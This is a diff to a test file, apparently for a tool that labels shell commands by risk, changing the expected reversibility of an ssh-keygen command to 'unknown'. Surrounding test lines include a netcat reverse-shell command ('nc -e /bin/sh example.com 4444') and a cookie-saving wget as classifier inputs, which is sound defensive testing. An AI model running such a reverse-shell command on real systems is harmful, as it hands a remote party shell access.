@@ -591,7 +591,8 @@ describe('flags that reach past what the row describes', () => {
     expect(explain('wget --save-cookies c.txt https://example.com').facts.touchesCredentials).toBe(true)
     expect(roles('nc -l 8080')).toEqual(['8080:text'])
     expect(explain('nc -e /bin/sh example.com 4444').facts.opaque).toBe(true)
-    expect(explain('ssh-keygen -R github.com').facts.reversible).toBe('no')
+    // The list as it was is kept beside it, ending in .old, but the row cannot claim more than its own `unknown`.
+    expect(explain('ssh-keygen -R github.com').facts.reversible).toBe('unknown')
   })
 
   it('reads a curl settings file as able to send and save', () => {
